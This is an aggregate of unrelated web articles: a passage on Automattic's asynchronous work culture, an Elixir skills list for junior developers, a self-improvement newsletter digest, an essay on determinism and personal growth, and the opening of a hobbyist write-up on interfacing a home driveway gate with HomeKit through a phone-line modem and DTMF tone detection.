<p>If you’re used to popping into someone’s office to get an answer or sending an email and expecting a reply within minutes, Automattic’s culture of asynchronous communication will feel very foreign. This doesn’t mean that you can’t get answers quickly. Afterall, we have an entire internal system of searchable information from all of our p2s, over 3,000 slack channels to pop into to ask questions, and coworkers on at all times of the day thanks to our global workforce. In order to take advantage of our global workforce though, asynchronous communication is critical to embrace and champion. This sometimes means building in more time into a project in order to get proper asynchronous alignment or doing the work to document decisions as you go so others can review when they can.&nbsp;</p>



<p><strong>Team lead role is not a promotion&nbsp;</strong></p>



<p>At most companies, it’s common for the person leading you to have experienced a promotion in taking on the role. At Automattic, we view taking on the team lead role as a focus change rather than as a promotion. This means people are welcome to step up into the lead role and step down without a change in salary. We’re all ultimately individual contributors at the end of the day! Approaching leadership in this way is powerful but can be confusing for some. For example, I was a lead for 3.5 years and was able to easily step away to pursue other work when an opportunity came up without a change in pay. I never approached leadership as being a “forever lead” which helped me make decisions that I knew I’d have to live out if down the line I was no longer a lead. For some in the tech world, leveling is everything. It’s career growth, it communicates value externally, etc. It can be unnerving to enter a company where that’s not a part of the culture with that greater context in mind despite the benefits it brings! This definitely isn’t for everyone. For me, I loved that I could flex some formal leadership muscles for a time and step down without feeling like it was impacting my career when the time was right.&nbsp;</p>



<p><strong>High trust, high responsibility environment</strong></p>



<p>Automattic operates from a place of trust whether with the level of access we give to our systems, our open vacation policy, and more. The high trust environment in turns creates one of high responsibility to own problems, help each other, and move work forward. This isn’t for everyone! I have definitely had my own moments of panic where it felt like I was about to leap into the unknown without knowing if what I was doing was right or sanctioned. I’ve found the key is communicating early, taking time to do outreach to relevant people, flagging up problems as they arise, and owning (before fixing) mistakes. If you’re used to getting an idea signed off on from 5 people more senior than you to know your work is sanctioned or not being able to run with an idea you have, this might be a jarring experience requiring a level of vulnerability and courage that can be intense. The good news is that this aspect of our culture makes us very open to owning mistakes and helping prevent others from making the same ones in the future!</p>



<p><strong>Evolving job responsibilities</strong></p>



<p>I was a Happiness Engineer for over 5 years before switching to my current role as a Developer Relations Wrangler. Each of those 5 years were wildly different! From team structure to product focus to day to day work, everything changed regularly. At the start, I only focused on one product (VaultPress) while working on a development team of 5-6 people. By the time I left the role, an entire happiness division of 30+ people I helped create was in charge of supporting 8+ products. Some years I spent more time flexing technical skills digging into hacked sites and other years I spent more time refining my softer skills as a lead. I loved the variety and the seemingly never ending chances to grow but, for some, this can feel overwhelming and like you’re always behind rather than always growing.&nbsp;</p>



<p><strong>Operating with great transparency&nbsp;</strong></p>



<p>It’s hard to explain just how transparent our work is since we spend so much time documenting decisions, discussing asynchronously, etc. Need to figure out why a decision was made 5 years ago? You can likely look it up and find out why. I regularly look up decisions from Past Anne and pause to give thanks that our culture prioritizes this transparency so I can learn from so many coworkers whether they are still working with me or not. This isn’t always easy especially if you’re doing a project and suddenly a fellow Automattician has some hard hitting questions! This is common in our culture of transparency and collaboration as it’s expected that anyone can ask about anything. For some people who are used to just making decisions without informing others of the why, this can be a grueling process to go through. You better have an answer for “Where and why was this decision made?”! I’d argue it ultimately refines your thinking and makes the outcome better. Thankfully, our system of p2s make it easy to build this habit of consistent communication.&nbsp;</p>



<p><strong>Lack of standardization in approach</strong></p>



<p>Outside of the key values that guide our culture mainly <a href="https://automattic.com/creed/">built around our creed</a> and the general open source ethos, there’s very little that’s truly standardized. This leaves room for great experimentation with teams figuring out what works best for them. The biggest downside to this is inconsistency causing it hard to figure out sometimes what’s going on at the highest level across the company. We’ve experimented with various ways to combat this from each team writing 3 year plans to teams sharing …</p></div></div></div>

December 8, 2020 | https://curiosum.dev/blog/elixir-key-skills-junior | <a href="https://web.archive.org/web/*/https://curiosum.dev/blog/elixir-key-skills-junior">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Elixir is not magic - despite being easy to write in and learn, you need a strong foundation. In this short article, I will give you my personal list of things that are necessary (or at least very much a “should-have”) for Junior Elixir developers.</p><div>
<p>The power of Elixir is considerable - it is a functional language compiled to <a href="https://www.erlang.org/" target="_blank">Erlang</a>, so you get amazing concurrency and uptime. A narrow core or powerful tools and utilities open a whole world of possibilities and manage complexity as very few languages can. What you write will be able to run for a long time, will tolerate faults, and be easily scalable.</p>
<p>The syntax you will be working with is one of the easiest to learn and conceptualize, especially to those with a flavor of Ruby in their experience. Even to complete newcomers, good building tools and growing vaults of libraries allow a smoother learning curve. Elixir community simply rocks - although, admittedly, it is not huge.</p>
<p>That’s the good part - but let’s get a bit more specific.</p>
<ol>
<li><strong>A sense of concurrency and scale</strong>
</li>
<li><strong>HTTPS and server stuff</strong>
</li>
<li><strong>Databases</strong>
</li>
<li><strong>Pipeline-style data processing</strong>
</li>
<li><strong>General Adaptability (tinkering)</strong>  
</li>
</ol>
<hr>
<h2>1.  A sense of concurrency and scale</h2>
<p>What is concurrency? Imagine computing as a race, which is won only when every competitor finishes the track. In most cases, the runners (processes) are tied together with a rope - when one fails, the rest cannot move much further. What if you untie the racers, and let them finish in whatever order they like, without affecting the final result?</p>
<p>Concurrency is usually not the first or third thing beginner developers start from, but at worst, Elixir developers should prepare themselves early. Elixir has many applications, but where the magic truly happens is if you need to do a lot at the same time. Unlike the more intertwined ways other technologies work, Elixir can skim through several processes flopping at the same time - as probably, dozens more will run independently and fault-free in the background.</p>
<p>Without this coupling, an Elixir system can have some self-repairing qualities, its processes are very light, and therefore can be run on all CPUs at the same time. In this respect, Elixir is like its father, Erlang, which is described as “write once, run forever”. They both share a concurrency model, which is markedly different than the usual threading. The key distinction here is this:</p>
<p><em>You share data by passing messages</em></p>
<p>instead of</p>
<p><em>Passing messages to share data</em></p>
<p>If this is not clear (it is much clearer in practice), head <a href="https://elixirschool.com/en/lessons/advanced/concurrency/" target="_blank">here</a> to read a little bit more about how Elixir manages concurrency. For a more descriptive account, listen to this <a href="https://www.devnlife.com/episodes/elixir-concurrency-vs-parallelism-games-with-code" target="_blank">podcast episode</a> from Dev’n Life.</p>
<p>You will need a strong grasp of concurrency and the underlying actor model to start doing more complex things in Elixir, and therefore, to jump up in seniority. Start early!  </p>
<h2>2.  HTTPS and server stuff</h2>
<p>A lot of your future work in Elixir will be related to web apps. Therefore, more generally, it will be governed at some level by the HTTP protocol and server infrastructure.</p>
<p>Elixir is armed with some sneakily good web frameworks - I’m talking Phoenix and Absinthe, to name the most popular. But you can’t do much in them without at least basic knowledge of how the web works.</p>
<p>There are several things I would start with. First, learn the basic request-response communication cycle, which is nicely <a href="https://medium.com/@jen_strong/the-request-response-cycle-of-the-web-1b7e206e9047" target="_blank">explained here</a>. You should not only know the <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank">HTTP status codes</a> but what to do when they occur. A useful distinction is that between POST and PUT methods, and there is a good <a href="https://stackoverflow.com/questions/107390/whats-the-difference-between-a-post-and-a-put-http-request" target="_blank">explainer thread</a> over at Stack Overflow. This one-hour video will bring you up to speed with <a href="https://www.youtube.com/watch?v=sovAIX4doOE" target="_blank">using cookies in HTTP</a>. Next, polish your knowledge of <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank">HTTP headers</a>, courtesy of Mozilla. A nice finishing touch for this starting inventory would be some Web Socket knowledge. It is a broad topic, but read <a href="https://blog.logrocket.com/websockets-tutorial-how-to-go-real-time-with-node-and-react-8e4693fbf843/" target="_blank">this blog</a> post to get the basics.</p>
<p>If you have most of the above covered and want to build up the case for future promotions, learn some DevOps practices and philosophy. Beginner level tutorials are available on <a href="https://www.youtube.com/watch?v=ZtvpS5eVVDs" target="_blank">youtube</a>, with dozens of free or cheap courses available in <a href="https://www.udemy.com/topic/devops/" target="_blank">Udemy</a> or <a href="https://www.coursera.org/courses?query=devops" target="_blank">Coursera</a>. This will come in handy both for Elixir work, and server.</p>
<h2>3.  Databases</h2>
<p>If you struggled with databases in your previous technology - worry not, Elixir will make your life a bit better. And if you have no relevant experience, Elixir will not throw many logs under your legs during the learning process.</p>
<p>Do not get too happy yet - Elixir, as I will explain in the last point of this list, is not for those, who want everything out of the box. With databases, a typical Ruby deployment will do a lot of stuff for you, like the creation of the initial database and seeding it. In Elixir, however, some of it is on you.</p>
<p>After the initial hurdle, Elixir fares extremely well. Its database wrapper (<a href="https://hexdocs.pm/ecto/getting-started.html" target="_blank">Ecto</a>) handles both SQL and NoSQL. It is even more than that, as it is also a <a href="https://errolhassall.com/blog/2018/6/17/elixir-connecting-to-databases-part-1" target="_blank">language integrated query</a>.</p>
<p>Since you will spend considerable time developing apps with PostgreSQL or some similar SQL databases for data storage in your project, knowing how Elixir works with them is a useful thing to flash during the recruitment process.  </p>
<h2>4.  Pipeline-style data processing</h2>
<p>As Elixir is a functional language, it heavily promotes data processing that can be described as pipelines modeled as compositions of functions that transform immutable data structures. If you find this style of data processing comfortable, you will feel at home. Once you get more advanced, libraries such as GenStage or Flow will make you feel at home applying it in a distributed environment, which is one of Elixir’s main strengths.</p>
<p>There are interesting case studies and workshops to listen to and watch on this topic. For an authoritative source, <a href="https://youtu.be/tPu-P97-cbE" target="_blank">try recordings</a> from ElixirConf, or watch <a href="https://www.youtube.com/watch?v=rLjWbathKEQ" target="_blank">this</a> short explainer.  </p>
<h2>5.  Become a Master Tinkerer</h2>
<p>Who is a tinkerer? In short, it is a person who, when seeing an unknown button or dial, is going to press it - just for the, ekhm, sake of it. A person that wants to go deep into things, and is persistent enough to look for their own solutions, where there may be none present yet.</p>
<p>The whole idea behind Elixir is, that you have a powerful core, that must be supplemented by libraries that contain the “extra” functionalities. This was done to reduce bloat and keep processes inherently light and quick. This philosophy also permeates to the library creators themselves.</p>
<p>So when you try to find a very specific library for a niche task, this is not Java or Ruby - where a short trip through GitHub will give you 20 proposed solutions. In some cases, be prepared to write stuff on your own. Elixir is exceptionally extendable. Its core and the underlying power of BEAM VM are meant to be applicable to a very broad set of use cases.</p>
<p>The main tools to broaden what Elixir can do are <a href="https://dockyard.com/blog/2017/12/07/macro-madness-how-to-use-use-well" target="_blank">macros</a> and <a href="https://elixir-lang.org/getting-started/sigils.html" target="_blank">sygils</a>, and I advise to get familiar with at least those two.   </p>
<p><em>Good luck on your path to Elixir excellence! 
Michał</em></p>

However, sharing this one from a while back given our number of subscribers has increased 4,000% since it was written (Thank you to everyone!). </em></p><h4><a href="https://www.butwhatfor.com/habits-maketh-the-man-and-un-maketh-him-too/">Habits Maketh the Man (and Un-Maketh Him, Too)</a><strong><a href="https://www.butwhatfor.com/habits-maketh-the-man-and-un-maketh-him-too/"> </a></strong></h4><p>Life is complex. Chaotic. Surprising. Uncertain. It is full of new things – many of which can kill us. And that’s a problem, because we humans tend to prefer not dying. Fortunately, we have been practicing surviving for quite some time and have developed a way to&nbsp;<a href="https://medium.com/@beatsbyvanity/jordan-b-peterson-how-to-organize-your-life-for-success-d49cf42569ba">cut down on that chaos with a bit of order</a>: the ability to form habits. However, and unfortunately for those humans looking for more in life than just survival, these habits often have more control over us than we have control over them.</p><p>…</p><p>And it’s a slog for sure, with ups and downs. But what is interesting about all of this is that you don’t actually have much of a choice – you have to play the habit game, so to speak. </p><p>You have a set of habits that got you to where you are today. Those are either moving you towards the future identity that you want, or away from it. Which direction are you moving? Are you happy with that?</p><h2>Elsewhere</h2><p><em>(Underlined titles are links to sources)</em></p><h4><strong><a href="https://amzn.to/2UUqhT7">The Volunteer: The True Story of the Resistance Hero Who Infiltrated Auschwitz</a>&nbsp;[Book]</strong></h4><ul><li><p><strong>Takeaway: <a href="https://www.goodreads.com/quotes/137-he-who-has-a-why-to-live-for-can-bear">He who has a “why” to live can bear almost any “how”</a></strong></p></li></ul><p>He mistakenly feared it was the start of the “Jewish method” being applied to the Poles. In fact, Nazi leadership intended to drastically reduce the number of Poles in their territories by up to 85 percent, but wholesale extermination had been ruled out. As one German official observed, “That sort of solution [using the gas chambers on more than just the Jews]&nbsp;. &nbsp;. &nbsp;. would hang over the German people and deprive us of sympathy everywhere.”</p><p>…</p><p>His attorney usually advised clients to beg forgiveness of the court. But Witold refused. “I tried to live my life in such a fashion,” he told the courtroom, “so that in my last hour, I would rather be happy than fearful. <a href="https://www.butwhatfor.com/a-stoic-philosopher-in-a-hanoi-prison/">I find happiness in knowing that the fight was worth it.</a>” He reiterated the fact that he was a Polish officer following orders.</p><p>…</p><p>Patriotism of this strength can seem outdated or worrisomely like the preserve of a far-right rising on a tide of nationalism. But we must also reckon with the fact that Witold’s patriotism furnished him with a sense of service and a moral compass that sustained his mission in the camp. Ultimately he couldn’t save his comrades, or the Jews. He makes no apologies for that fact, but neither does he hide his failure. Rather, he suggests in his final writings that we must come to understand our limits, even as he exhorts us to see past them. </p><p>Above all, he asks us to trust one another. Witold’s defining quality was his ability to place his faith in other people. In the camp, where the SS sought to break the prisoners down and strip them of their values, the idea of trust had revolutionary potential. So long as the prisoners could believe in the greater good, they were not defeated. Witold’s men perished in many terrible and excruciating ways, <a href="https://www.butwhatfor.com/stand-up-straight-with-your-shoulders-back/">but they did so with a dignity that Nazism failed to destroy</a>.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5a43a3f4-b0f5-4708-a7c6-90461102300d_2152x1032.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5a43a3f4-b0f5-4708-a7c6-90461102300d_2152x1032.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/5a43a3f4-b0f5-4708-a7c6-90461102300d_2152x1032.jpeg&quot;,&quot;height&quot;:698,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Witold Pilecki's Heroism in the Face of Unspeakable Evil - History Arch&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt="Witold Pilecki's Heroism in the Face of Unspeakable Evil - History Arch"></a></figure></div><h4><strong><a href="https://waitbutwhy.com/2015/12/the-tail-end.html">The Tail End</a> [Link]</strong></h4><ul><li><p><strong>Takeaway: Make sure you actively set priorities in your life and don’t let the inertia of past decisions make them for you</strong></p></li></ul><p>I’ve been thinking about my parents, who are in their mid-60s. During my first 18 years, I spent some time with my parents during at least 90% of my days. But since heading off to college and then later moving out of Boston, I’ve probably seen them an average of only five times a year each, for an average of maybe two days each time. 10 days a year. About 3% of the days I spent with them each year of my childhood.</p><p>Being in their mid-60s, let’s continue to be super optimistic and say I’m one of the incredibly lucky people to have both parents alive into my 60s. That would give us about 30 more years of coexistence. If the ten days a year thing holds, that’s 300 days left to hang with mom and dad. Less time than I spent with them in any one of my 18 childhood years.</p><p>When you look at that reality, you realize that despite not being at the end of your life, you may very well be nearing the end of your time with some of the most important people in your life. If I lay out the total days I’ll ever spend with each of my parents—assuming I’m as lucky as can be—this becomes starkly clear:</p><p>It turns out that when I graduated from high school, I had already used up 93% of my in-person parent time. I’m now enjoying the last 5% of that time. We’re in the tail end.</p><h4><a href="https://physiqonomics.com/fat-loss/">The Best Fat Loss Article on the Internet</a> [Link]</h4><ul><li><p><strong>Takeaway: One size doesn’t usually fit all, so make sure you are considering your situation when making decisions</strong></p></li></ul><p>If you’re unhappy with your weight, or your body, for whatever reason, that’s your problem.

The silver bullet, the trimtab, the miracle cure, the secret passage, the magic password, the single hero who turns the tide of history. The nearly effortless way to cut through or leap over huge obstacles. We not only want to believe that there are leverage points, we want to know where they are and how to get our hands on them. Leverage points are points of power…</p><p>Magical leverage points are not easily accessible, even if we know where they are and which direction to push on them. <a href="https://www.butwhatfor.com/perseverance-is-great-but-dont-forget-to-prepare/">There are no cheap tickets to mastery. You have to work hard at it</a>, whether that means rigorously analyzing a system or rigorously casting off your own paradigms and throwing yourself into the humility of Not Knowing. In the end, it seems that mastery has less to do with pushing leverage points than it does with strategically, profoundly, madly letting go.</p><h4><strong><a href="http://www.behaviouraldesign.com/2017/04/06/mirrors-can-improve-customer-service-and-even-reduce-spitting-et/#sthash.F3KdFZRO.O5tkSKpG.dpbs">Mirrors Can Improve Customer Service and Even Reduce Spitting</a> [Link]</strong></h4><ul><li><p><strong>Takeaway: Make sure to watch yourself, or you might find you are doing things you don’t want to see yourself doing</strong></p></li></ul><p>In an interesting experiment, behavioural scientist Arthur Beaman and his colleagues called children to a known local house in the neighbourhood.

        <p>A fraction of our behaviors are governed by patterns that, upon closer examination, reveal significant steps in personal development. This article is intended for those who wish to introspect and recognize their patterns as part of the necessary step to grow and prevent becoming an oppressor.</p>

<p>In common use, to believe oneself free is to deny the existence of the causes that explain one’s behavior. To say “I was free to go by the left or by the right” actually means “I don’t know the reasons that make me take one path rather than another”, the reasons exist, we just don’t know them<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. This is the principle of <a href="https://en.wikipedia.org/wiki/Causality_(physics)">causality</a>.</p>

<p>Those who believe they are free tend to believe that others are free for the same reasons. Believing that others act freely is then equivalent to denying the existence of causes in their actions. To say “this person is free to become an engineer or an artist” actually means “I don’t know why this person is in this career rather than another”.</p>

<h2 id="deny">Deny</h2>

<p>Denying the existence of causes is not an isolated problem and Etienne Klein illustrates this very well through a funny anecdote (video in French):</p>

<iframe src="https://www.youtube-nocookie.com/embed/Fj5r1ry2TTU?start=217" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<blockquote>
  <p>The other day […], I was giving a lecture at Central [Grande École in France] on relativity and I was doing the same calculation of Einstein’s 1905 calculation in which they show that the duration of a phenomenon depends on the speed of the observer in relation to this phenomenon […]. At the end of the demonstration a pupil asks to speak and says to everyone “Sir, I do not agree with Einstein”. I was happy, I had a student who had a critical mind, I ask him to argue. I was expecting him to talk about Poincaré who restores the luminiferous aether… in short, to argue. That he would argue from arguments that come from physics and the guy says “Sir I don’t believe the dilation of time because I don’t feel it”. In other words, this young man who was accepted in Centrale, <em>thought that his feeling, his subjectivity, had a power great enough to be able to discredit what a century of objectification has made it possible to establish</em>. - Etienne Klein</p>
</blockquote>

<p>In our case, it is not about physical phenomena but about human behavior. People denying (consciously or not) the deterministic character on which our behavior depends, oppose the theories that are more than a century old, such as the social determinism of Emile Durkeim for example. This attitude, in addition to being obsolete, is dangerous.</p>

<h2 id="dangers">Dangers</h2>

<p>Omitting the reasons for human behavior leads to difficult situations that are encountered in many different contexts:</p>
<ul>
  <li>A bad parent gets angry at its child without trying to understand the reasons for its child’s misbehavior. In fact, the child felt lonely throughout dinner and wanted to get someone’s attention.</li>
  <li>A bad manager blames an employee without trying to find the reasons for the delay. In fact, what was asked for in the first place didn’t make much sense when looking at it more closely and a redesign was required, making the delivery as late as necessary.</li>
  <li>A bad engineer denigrates the misuse of a system by a user without ever trying to meet the person. In fact, no user input control was implemented, leaving the system capable of harming itself.</li>
  <li>etc.</li>
</ul>

<p>Getting rid of the need to understand others generates a lot of frustration, especially if it involves a hierarchical relationship. If at the level of a team, “first accountability and then blame” is disastrous, imagine at the level of a nation.</p>

<blockquote>
  <p>Moreover, the frequency of torture is always a sign of faith or laziness in the Government. There is no evil that cannot be made good for something. Jean-Jacques Rousseau — Du contrat social (1762)</p>
</blockquote>

<h2 id="reasons">Reasons</h2>

<p>So where does this trend come from? There are many reasons. Etienne Klein explains it by laziness and narcissism: “I find that this relativism, when it is too strong, is a perfect legitimization of <em>intellectual laziness</em>, that you can judge what is going on in Nature from your subjectivity alone, sometimes even from your narcissism alone. It relieves you of having to learn a couple of things about quantum mechanics, particle physics or the Higgs boson”.</p>

<p>Confirmation bias or <em>conflict of interest</em> stem also that tendency. This is why, a manager of a team prefers to believe that another team is intrinsically incompetent rather than investing some of my resources in training them.</p>

<p>Last example: <em>who would boast of not being free?</em> It is even the first term of the French national motto “liberty, equality, fraternity”.</p>

<p>Although these reasons can be explained, they are no less dangerous. So what can be done?</p>

<h2 id="solution">Solution</h2>

<p>Recognize that <em>freedom is limited</em>. Don’t see this as a fatality; on the contrary, it is the essential point for growing up. Consider this as a constraint of the system you are designing, which hidden, cannot help to find the appropriate solution.</p>

<p>Once acknowledged, areas for improvement will come naturally. Some disciplines such as UX design have understood this early on. A designer will adjust the interface if many users interact in unexpected ways. User behaviors prevail over the designer’s wishes or predictions. Thanks to the trends in human behavior that UX has been able to establish principles, evaluate them, refine them, etc.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Are we free? Should we fight for our freedom? This article does not pretend to answer these questions. On the other hand, a fraction of our behaviors seem to be governed by patterns that, if we take the time to look into them, reveal actionable steps for personal development. Denying these patterns and neglecting the need to understand them is a lost opportunity to improve and may turn into oppression.</p>

<p>Assuming our behavior as the result of an unpredictable phenomenon is firstly a sign of narcissism, but above all a denial of the ability to introspect, to recognize our patterns, to understand ourselves, in other words, to grow. Expanding that idea to others is dangerous. Considering the behavior of others as absolutely unforeseeable is first naive toward the social sciences, but it is above all to rid ourselves of the responsibility to understand, to empathize, in fact to free the other. <a href="https://twitter.com/arnaud_debec/status/1332434506112970753">So acknowledge you live in a cage before planning to escape</a>.</p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="overview">Overview</h2>

<p>Over the past 8 weeks, I built a HomeKit accessory to open and close the gate at the end of my driveway.  The project was really fun, and this document outlines the process of creating it, from concept to working prototype.</p>

<h3 id="additional-background">Additional Background</h3>

<p>Programming examples for microcontrollers will be in C++.  For the most part, we’ll be sticking essentially to “C with Classes”, which is typical of most Arduino and other microcontroller projects.</p>

<p>The data in this document is by no means meant to be comprehensive.  I am not an electrical engineer, and welcome any corrections or other feedback.  Where possible, I’ve cited references or resources I found useful at each step.  For the most part, extensive googling served as the primary research tool.</p>

<p>The swing gate in question is a Sentex Crown Jewel, which was available in the early 2000s. It interfaces with a home phone system to control 1 or 2 relays.  Programming is performed either via the gate keypad, or via 300 baud modem connected to a Windows program.  Later in this document we’ll show how to use a listening modem to eavesdrop on the communication to reverse engineer the app-only commands which are not in the publicly available references.</p>

<p>Further data for those interested can be found</p>
<ul>
  <li><a href="https://p.widencdn.net/51eik7/6001141">Crown Jewel Programming manual</a></li>
  <li><a href="https://p.widencdn.net/np06ng/6001145">Crown Jewel Installation manual</a></li>
</ul>

<h2 id="concept">Concept</h2>

<p>The problem I aimed to solve was to interface the gate microcontroller to HomeKit.  The only interfaces to the gate are a keypad (outside the gate) and a home phone line.  The previous owners did not install the manual operation switch, so I would frequently forget to open the gate when walking into town, get to the gate, then go back inside to dial the phone access code.  It would be great to just pull out a phone or say “hey Siri open the gate”.</p>

<p>First thing to do is to decompose the goal into tasks small enough that each can have easily understandable requirements and success criteria.  Another benefit of this process is that having many small tasks to complete will give us a sense of accomplishment and provide motivation as we complete them 🙂</p>

<h3 id="problem-1---phone-interface-to-swing-gate">Problem 1 - Phone Interface to Swing Gate</h3>

<p>Objective: Implement software library that can send and receive phone number tones, and communicate with a 300 baud modem.</p>

<p>Success Criteria:</p>

<ul>
  <li>Detect when phone is off hook, and listen for DTMF tones to keep HomeKit state in sync when other users control the gate from the phone line.</li>
  <li>Take phone off hook and dial numbers to control gate relay.</li>
  <li>Communicate via 300 baud modem (Bell 103) protocol.</li>
</ul>

<h3 id="problem-2---homekit-support">Problem 2 - HomeKit Support</h3>

<p>Objective: The microcontroller + phone line interface should appear as a home kit accessory.</p>

<p>Success Criteria:</p>

<ul>
  <li>Successfully pair the device with HomeKit</li>
  <li>Implement a service that  allows opening and closing the gate</li>
  <li>Demonstrate control via “Hey Siri open the gate”</li>
</ul>

<h3 id="problem-3---physical-prototype">Problem 3 - Physical prototype</h3>

<p>Objective: Combine the proofs of concept of the phone interface, and homekit device, into a single logic board, have that board manufactured, and enclose it in a case.</p>

<p>Success Criteria:</p>

<ul>
  <li>Capture a schematic which contains all necessary circuits for correct operation of the system.</li>
  <li>Arrange the physical design of those components and signals into a printed circuit board using a CAD program.</li>
  <li>Manufacture the board.</li>
  <li>Enclose the assembled board in a case so we can handle it safely and easily.</li>
</ul>

<h2 id="phone-interface-to-swing-gate">Phone Interface to Swing Gate</h2>

<p>The first piece of the project is the phone line interface.  Reviewing the requirements from earlier, our first requirement is “Detect when phone is off hook, and listen for DTMF tones”.</p>

<p>Decomposing this further, we need to:</p>

<ul>
  <li>Understand how to interface a microcontroller to a phone line</li>
  <li>Understand how to take the phone “off hook”</li>
  <li>Do some signal processing to detect tones, for example, someone pressing the number “9” on a phone keypad.</li>
</ul>

<h3 id="digital-access-arrangement">Digital Access Arrangement</h3>

<p>In the United States, home phone lines usually consist of a pair of wires, Tip and Ring, with a nominal -48VDC between them.  These wires carry the signal (voice or data), and the voltage and resistance between them indicates various states (on hook, off hook, ringing, etc.) <a href="https://en.wikipedia.org/wiki/Plain_old_telephone_service" title="Wikipedia Plain Old Telephone Service">Additional info at Wikipedia</a>.</p>

<p>Since the voltage on the lines (48v) is well above that typically interfaced to a microcontroller (1.8-5.0v), we need some circuitry to extract the signal from the phone line, convert it to a voltage compatible with our processor.  Additionally, this circuitry should provide isolation of our circuitry from the phone circuit, to protect against transient voltage spikes.  A nice discussion of isolation is <a href="https://www.silabs.com/documents/public/application-notes/AN1167.pdf" title="Safety Considerations for Silicon Labs Series Capacitor Isolators">here</a>.  In this application we’ve chosen to use a surge suppression capacitor that will fail open but magnetic isolation via a small transformer is also common in modem designs.</p>

<p>Since there are quite a few components in even simplified / cost reduced DAA’s (see page 21, &lt;&gt;) I opted to buy a reference board for the <a href="https://ixysic.com/Products/LITELINK.htm">Ixys CPC5622 Litelink III DAA</a>. Additional info can be found in the <a href="https://www.ixysic.com/home/pdfs.nsf/www/UG-LLIII-EB.pdf/$file/UG-LLIII-EB.pdf">CPC5622-EVAL Evaluation Board Users Guide</a>.</p>

<h3 id="integration-with-arduino-uno">Integration With Arduino Uno</h3>

<p>Connecting the Eval board for the Litelink DAA to the Arduino so that we can start looking at phone line signals is pretty straight forward.  Looking at the Fritzing diagram below, we’ve connected an I2C oled to the Uno so we can see what’s happening.  The eval board implements DC-blocking capacitors on the TX/RX lines, so we implement a voltage divider with a pair of resistors, and connect the RX line (pink) from the 5622 to A0 on the Uno, putting the “zero point” at 1.65V (3.3/2).  We wire up a phone jack to the J1 header on the eval board, and we connect 3.3v through a 10k resistor to AREF on the Uno, setting the analog reference for ADC measurements at 3.3 * 32/(32+10) == 2.5v.  Since the Uno doesn’t have a differential ADC, the Vpp (peak to peak voltage) on the RX+ line from the eval board should be &lt;1V so we shouldn’t clip under normal operation, and get more precision out of the ADC by using more of its range vs. the standard 0-5V.  “Off Hook” (orange) is pulled up as required by the 5622.</p>

<p><img src="https://sampo3k.github.io/images/fritzing.jpg" alt="5622EVAL Fritzing"></p>

<p>Success!  At this point, we can read A0, and see the voltage held roughly constant at 1.65v when on hook, and if you pick up a receiver on the phone line connected to the 5622, you will start seeing the voltage vary as the call progress (dial) tone is received, or connect an oscilloscope and visualize it.</p>
<h3 id="digital-signal-processing">Digital Signal Processing</h3>

<p>Now we have an analog signal into our Uno, and can move on to the next requirement: decode DTMF tones. <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling" title="Link to Wikipedia article on DTMF">Dual-tone multi-frequency</a> (DTMF) is way each key on a phone key pad is converted into analog signals.  The wikipedia article does a really good job summarizing what’s going on.</p>

<p>At this point we need to do some Digital Signal Processing (DSP) to figure out which frequencies are present in the signal we’re receiving, and then see if there are exactly two strong signals that happen to be one of the 16 DTMF pairs.</p>

<p>I’m not going to go too deeply into DSP here, but for a better understanding of what we’re trying to do, I cannot recommend these two resources highly enough.</p>

<ol>
  <li>
    <p><a href="https://jackschaedler.github.io/circles-sines-signals/">Intro to DSP</a>: This website has amazing interactive tutorials that explains some of the fundamentals of digital signal processing in a really neat and useful way.</p>
  </li>
  <li>
    <p><a href="http://www.dspguide.com/">DSP book</a>: This book is a wealth of information on DSP techniques, and the PDFs of each chapter are available for free.  With some effort, you can even concatenate them together into the entire book :)</p>
  </li>
</ol>

<h3 id="tone-detection">Tone Detection</h3>

<p>For DTMF, the typical sequence we are looking for is &gt;=100ms of tone and &gt;=100ms of silence repeated for however many digits we are listening for.</p>

<p>The common approach to frequency detection is an FFT.  However, the performance of the 16MHz ATMega328P makes this difficult.  For example, we need the FFT bins about 70Hz apart or less to discriminate the DTMF tones.  So that means at 8KHz we need roughly  8000/70 = 114 samples or more.  Rounding up to a convenient power of 2 for the FFT, we’ll say 256/2 = 128 FFT bins. The bins will be 8KHz / 128 = 62.5Hz apart.</p>

<p>To do a 256 sample FFT, in addition to a reasonable amount of memory, we’d need something on the order of ~8k multiplies and ~8k additions, which given the performance of 16x16+32 MAC is around 50 cycles, our most wildly optimistic projection here if we hand coded a great FFT is like 25-30ms, or about 0.5x realtime. This seems to line up well with the results on this <a href="https://www.norwegiancreations.com/2019/03/arduino-fft-pt-2-improving-the-hardware-for-real-time-analysis/" title="Arduino FFT pt. 2: Improving the Hardware for Real-time Analysis">Arduino FFT post</a>. We also use the same performance hack noted there to reduce the ADC prescaler on the ATMega328 so that ADC reads don’t take so long.</p>

